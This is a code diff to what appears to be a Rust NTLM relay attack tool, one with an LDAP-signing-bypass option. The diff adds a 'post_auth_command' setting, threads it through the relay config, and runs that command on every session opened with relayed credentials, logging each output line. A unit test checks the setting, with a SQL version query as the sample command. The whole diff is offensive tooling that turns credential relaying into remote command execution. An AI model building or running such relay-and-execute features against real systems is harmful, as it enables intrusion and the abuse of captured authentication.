@@ -24,6 +24,8 @@ pub struct HttpRelayConfig {
     pub ldap_signing_bypass: bool,
     pub max_retries: u32,
     pub timeout_secs: u64,
+    /// Command executed on relayed sessions (see `RelayConfig::post_auth_command`).
+    pub post_auth_command: Option<String>,
 }
 
 impl Default for HttpRelayConfig {
@@ -36,6 +38,7 @@ impl Default for HttpRelayConfig {
             ldap_signing_bypass: true,
             max_retries: 3,
             timeout_secs: 30,
+            post_auth_command: None,
         }
     }
 }
@@ -85,6 +88,7 @@ impl HttpRelay {
             max_connections: 64,
             tls_config: None,
             socks5_proxy: self.config.socks5_proxy.clone(),
+            post_auth_command: self.config.post_auth_command.clone(),
         };
         let relay = Arc::new(TokioMutex::new(NtlmRelay::new(relay_config)));
 
@@ -235,6 +239,12 @@ fn handle_client(
         .remove(&client_ip)
         .ok_or_else(|| RelayError::Protocol("No pending relay state for client".into()))?;
 
+    let relay_config_read = bridge.relay.clone();
+    let post_cmd = bridge
+        .handle
+        .clone()
+        .block_on(async move { relay_config_read.lock().await.post_auth_command() });
+
     let session = bridge.handle.block_on(async {
         let mut guard = bridge.relay.lock().await;
         guard
@@ -243,11 +253,28 @@ fn handle_client(
     });
 
     match session {
-        Ok(session) => {
+        Ok(mut session) => {
             info!(
                 "HTTP relay succeeded: {}\\{} -> {}://{}",
                 session.domain, session.username, session.target.protocol, session.target.address
             );
+            if let Some(cmd) = post_cmd {
+                match bridge.handle.block_on(async {
+                    crate::relay::run_post_auth_command(&mut session, &cmd).await
+                }) {
+                    Ok(output) => {
+                        for line in output.lines() {
+                            info!("Post-auth ({}): {}", cmd, line);
+                        }
+                    }
+                    Err(err) => {
+                        warn!(
+                            "Post-auth command failed on {}: {}",
+                            session.target.address, err
+                        );
+                    }
+                }
+            }
             let resp = "HTTP/1.1 200 OK\r\nContent-Length: 0\r\nConnection: close\r\n\r\n";
             let _ = stream.write_all(resp.as_bytes());
             Ok(())
@@ -375,6 +402,7 @@ mod tests {
             ldap_signing_bypass: false,
             max_retries: 5,
             timeout_secs: 60,
+            post_auth_command: Some("SELECT @@version".to_string()),
         };
         assert_eq!(config.listen_ip, "10.0.0.1");
         assert_eq!(config.listen_port, 8080);
@@ -384,5 +412,9 @@ mod tests {
         assert!(!config.ldap_signing_bypass);
         assert_eq!(config.max_retries, 5);
         assert_eq!(config.timeout_secs, 60);
+        assert_eq!(
+            config.post_auth_command,
+            Some("SELECT @@version".to_string())
+        );
     }
 }
